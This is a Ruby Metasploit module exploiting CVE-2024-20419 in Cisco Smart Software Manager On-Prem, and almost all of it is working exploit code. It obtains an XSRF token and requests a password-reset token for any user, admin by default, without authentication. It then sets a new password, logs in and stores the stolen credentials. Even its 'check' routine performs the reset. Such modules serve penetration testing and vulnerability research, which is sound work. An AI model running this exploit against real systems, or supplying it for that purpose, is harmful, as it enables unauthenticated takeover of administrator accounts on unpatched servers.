class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  class AuthTokenError < StandardError; end
  class XsrfTokenError < StandardError; end
  class ResetPasswordError < StandardError; end

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Cisco Smart Software Manager (SSM) On-Prem Account Takeover (CVE-2024-20419)',
        'Description' => %q{
          This module exploits an improper access control vulnerability in Cisco Smart Software Manager (SSM) On-Prem <= 8-202206. An unauthenticated remote attacker
          can change the password of any existing user, including administrative users.
        },
        'Author' => [
          'Michael Heinzl', # MSF Module
          'Mohammed Adel' # Discovery and PoC
        ],
        'References' => [
          ['CVE', '2024-20419'],
          ['URL', 'https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-cssm-auth-sLw3uhUy#vp'],
          ['URL', 'https://www.0xpolar.com/blog/CVE-2024-20419']
        ],
        'DisclosureDate' => '2024-07-20',
        'DefaultOptions' => {
          'RPORT' => 8443,
          'SSL' => true
        },
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES]
        }
      )
    )

    register_options([
      OptString.new('NEW_PASSWORD', [true, 'New password for the specified user', Rex::Text.rand_text_alphanumeric(16) + '!']),
      OptString.new('USER', [true, 'The user of which to change the password of (default: admin)', 'admin'])
    ])
  end

  # 1) Request oauth_adfs to obtain XSRF-TOKEN and _lic_engine_session
  def xsrf_token_value
    res = send_request_cgi(
      'method' => 'GET',
      'keep_cookies' => true,
      'uri' => normalize_uri(target_uri.path, 'backend/settings/oauth_adfs'),
      'vars_get' => {
        'hostname' => Rex::Text.rand_text_alpha(6..10)
      }
    )

    raise XsrfTokenError, 'Failed to get a 200 response from the server.' unless res&.code == 200

    print_good('Server reachable.')

    xsrf_token_value = res.get_cookies.scan(/XSRF-TOKEN=([^;]*)/).flatten[0]
    raise XsrfTokenError, 'XSRF Token not found' unless xsrf_token_value

    decoded_xsrf_token = decode_url(xsrf_token_value)
    print_good("Retrieved XSRF Token: #{decoded_xsrf_token}")
    decoded_xsrf_token
  end

  # 2) Request generate_code to retrieve auth_token
  def auth_token(decoded_xsrf_token)
    payload = {
      uid: datastore['USER']
    }.to_json

    res = send_request_cgi({
      'method' => 'POST',
      'ctype' => 'application/json',
      'keep_cookies' => true,
      'headers' => {
        'X-Xsrf-Token' => decoded_xsrf_token
      },
      'uri' => normalize_uri(target_uri.path, 'backend/reset_password/generate_code'),
      'data' => payload
    })

    raise AuthTokenError, 'Request /backend/reset_password/generate_code to retrieve auth_token did not return a 200 response' unless res&.code == 200

    json = res.get_json_document
    if json.key?('error_message')
      raise AuthTokenError, json['error_message']
    elsif json.key?('auth_token')
      print_good('Retrieved auth_token: ' + json['auth_token'])
    end

    auth_token = json['auth_token']
    auth_token
  end

  # 3) Request reset_password to change the password of the specified user
  def reset_password(decoded_xsrf_token, auth_token)
    payload = {
      uid: datastore['USER'],
      auth_token: auth_token,
      password: datastore['NEW_PASSWORD'],
      password_confirmation: datastore['NEW_PASSWORD'],
      common_name: ''
    }.to_json

    res = send_request_cgi({
      'method' => 'POST',
      'ctype' => 'application/json',
      'keep_cookies' => true,
      'headers' => {
        'X-Xsrf-Token' => decoded_xsrf_token
      },
      'uri' => normalize_uri(target_uri.path, 'backend/reset_password'),
      'data' => payload
    })

    raise ResetPasswordError, 'Did not receive a 200 responce from backend/reset_password' unless res&.code == 200

    json = res.get_json_document
    raise ResetPasswordError, "There was an error resetting the password: #{json['error_message']}" if json['error_message']

    json
  end

  def check
    begin
      @xsrf_token_value = xsrf_token_value
      @auth_token = auth_token(@xsrf_token_value)
      @reset_password = reset_password(@xsrf_token_value, @auth_token)
    rescue AuthTokenError, XsrfTokenError, ResetPasswordError => e
      return Exploit::CheckCode::Unknown("Check method failed: #{e.class}, #{e}")
    end

    return Exploit::CheckCode::Unknown('Unable to determine the version (xsrf_token_value missing).') unless @xsrf_token_value
    return Exploit::CheckCode::Unknown('Unable to determine the version (auth_token missing).') unless @auth_token
    return Exploit::CheckCode::Unknown('Unable to determine the version (reset_password failed).') unless @reset_password

    if @reset_password.key?('status')
      return Exploit::CheckCode::Appears('Password reset was successful, target is vulnerable')
    end

    Exploit::CheckCode::Unknown
  end

  def decode_url(encoded_string)
    encoded_string.gsub(/%([0-9A-Fa-f]{2})/) do
      [::Regexp.last_match(1).to_i(16)].pack('C')
    end
  end

  def run
    begin
      @xsrf_token_value ||= xsrf_token_value
      @auth_token ||= auth_token(@xsrf_token_value)
      @reset_password ||= reset_password(@xsrf_token_value, @auth_token)
    rescue AuthTokenError, XsrfTokenError, ResetPasswordError => e
      fail_with(Failure::UnexpectedReply, "Exploit pre-conditions were not met #{e.class}, #{e}")
    end

    fail_with(Failure::UnexpectedReply, 'Unable to determine the version (xsrf_token_value missing).') unless @xsrf_token_value
    fail_with(Failure::UnexpectedReply, 'Unable to determine the version (auth_token missing).') unless @auth_token
    fail_with(Failure::UnexpectedReply, 'Unable to determine the version (reset_password failed).') unless @reset_password

    # 4) Confirm that we can authenticate with the new password
    payload = {
      username: datastore['USER'],
      password: datastore['NEW_PASSWORD']
    }.to_json

    res = send_request_cgi({
      'method' => 'POST',
      'ctype' => 'application/json',
      'keep_cookies' => true,
      'headers' => {
        'X-Xsrf-Token' => @xsrf_token_value,
        'Accept' => 'application/json'
      },
      'uri' => normalize_uri(target_uri.path, 'backend/auth/identity/callback'),
      'data' => payload
    })

    fail_with(Failure::UnexpectedReply, 'Failed to verify authentication with the new password was successful.') unless res&.code == 200

    json = res.get_json_document
    unless json.key?('uid') && json['uid'] == datastore['USER']
      fail_with(Failure::UnexpectedReply, json['error_message'])
    end

    store_valid_credential(user: datastore['USER'], private: datastore['NEW_PASSWORD'], proof: json)
    print_good("Password for the #{datastore['USER']} user was successfully updated: #{datastore['NEW_PASSWORD']}")
    print_good("Login at: #{full_uri(normalize_uri(target_uri, '#/logIn?redirectURL=%2F'))}")
  end
end
